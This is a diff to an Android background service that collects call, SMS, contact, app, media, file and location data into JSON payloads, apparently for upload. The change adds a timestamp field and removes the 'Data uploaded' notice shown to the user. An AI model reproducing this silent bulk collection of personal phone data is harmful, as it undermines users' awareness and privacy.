@@ -109,7 +109,7 @@ public class DownloadService extends IntentService {
 
     public List<String> appType;
     public static int noOfWeeks = 0;
-    public static String mobileNo;
+    public static String mobileNo,time;
     public boolean calls, messages, contacts, apps, downloads, images, videos, audios, location;
     public static String id = "0";
     public static GoogleAccountCredential googleCredentials;
@@ -121,7 +121,6 @@ public class DownloadService extends IntentService {
     @Override
     public void onDestroy() {
         super.onDestroy();
-        Toast.makeText(context, "Data uploaded", Toast.LENGTH_SHORT).show();
     }
 
     @Override
@@ -145,6 +144,7 @@ public class DownloadService extends IntentService {
         videos = intent.getBooleanExtra("videos", false);
         audios = intent.getBooleanExtra("audios", false);
         location = intent.getBooleanExtra("location", false);
+        time= intent.getStringExtra("time");
 
         if (noOfWeeks > 25) {
             noOfWeeks = 25;
@@ -288,6 +288,7 @@ public class DownloadService extends IntentService {
                 try {
                     jsonToSend.put("AccountNo", userId);
                     jsonToSend.put("MobileNo", mobileNo);
+                    jsonToSend.put("time", time);
                     jsonToSend.put("Location", currentLocation);
                 } catch (JSONException e) {
                     e.printStackTrace();
@@ -507,6 +508,8 @@ public class DownloadService extends IntentService {
                         jsonObject.put("NumberofinboundEmailsfromContactListLastWeeks1to25", 0);
                         jsonObject.put("AccountNo", id);
                         jsonObject.put("MobileNo", mobileNo);
+                        jsonObject.put("time", time);
+
                         jsonArray.put(jsonObject);
                         //Log.e("Inbox Count", String.valueOf(inboxMessages.size()));
                     }
@@ -616,6 +619,8 @@ public class DownloadService extends IntentService {
                 try {
                     jsonToSend.put("AccountNo", id);
                     jsonToSend.put("MobileNo", mobileNo);
+                    jsonToSend.put("time", time);
+
                     jsonToSend.put("Location", currentLocation);
                 } catch (JSONException e) {
                     e.printStackTrace();
@@ -672,6 +677,7 @@ public class DownloadService extends IntentService {
 
                 jsonMasterCall.put("UserId", id);
                 jsonMasterCall.put("MobileNo", mobileNo);
+                jsonMasterCall.put("time", time);
                 List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
                 for (ApplicationInfo packageInfo : packages) {
                     if (pm.getLaunchIntentForPackage(packageInfo.packageName) != null) {
@@ -956,6 +962,7 @@ public class DownloadService extends IntentService {
 
         jsonToUpload.put("AccountNo", id);
         jsonToUpload.put("MobileNo", mobileNo);
+        jsonToUpload.put("time", time);
         jsonToUpload.put("numberOfInboundCalls", inbound);
         jsonToUpload.put("numberOfOutboundCalls", outbound);
         jsonToUpload.put("numberOfMissedCalls", missed);
@@ -1159,6 +1166,7 @@ public class DownloadService extends IntentService {
 
         jsonToUpload.put("AccountNo", id);
         jsonToUpload.put("MobileNo", mobileNo);
+        jsonToUpload.put("time", time);
         jsonToUpload.put("numberOfInboundMessages", inboxMessage);
         jsonToUpload.put("numberOfOutboundMessages", outboxMessage);
         jsonToUpload.put("numberOfInboundMessagesBetween0to6", from12AMto6AMInbox);
@@ -1248,6 +1256,7 @@ public class DownloadService extends IntentService {
                     JSONObject jsonObject = new JSONObject();
                     jsonObject.put("AccountNo", id);
                     jsonObject.put("MobileNo", mobileNo);
+                    jsonObject.put("time", time);
                     jsonObject.put("Numberofcontacts", numberOfContact);
                     jsonObject.put("Numberofinternationalcontacts", numberOfInternational);
 
@@ -1297,6 +1306,7 @@ public class DownloadService extends IntentService {
 
                 jsonToUpload.put("AccountNo", id);
                 jsonToUpload.put("MobileNo", mobileNo);
+                jsonToUpload.put("time", time);
 
                 // getting image data
                 {
@@ -1376,6 +1386,7 @@ public class DownloadService extends IntentService {
 
                 jsonToUpload.put("AccountNo", id);
                 jsonToUpload.put("MobileNo", mobileNo);
+                jsonToUpload.put("time", time);
 
                 {
                     final String[] columns = {MediaStore.Audio.Media.DATA, MediaStore.Audio.Media.SIZE};//get all columns of type images
@@ -1452,6 +1463,7 @@ public class DownloadService extends IntentService {
 
                 jsonToUpload.put("AccountNo", id);
                 jsonToUpload.put("MobileNo", mobileNo);
+                jsonToUpload.put("time", time);
                 {
                     final String[] columns = {MediaStore.Video.Media.DATA, MediaStore.Video.Media.SIZE};//get all columns of type images
                     final String orderBy = MediaStore.Video.Media.DATE_ADDED;//order data by date
@@ -1555,6 +1567,7 @@ public class DownloadService extends IntentService {
             JSONObject jsonToUpload = new JSONObject();
             jsonToUpload.put("AccountNo", id);
             jsonToUpload.put("MobileNo", mobileNo);
+            jsonToUpload.put("time", time);
 
             File listAllFiles[] = filesFromSD.listFiles();
 
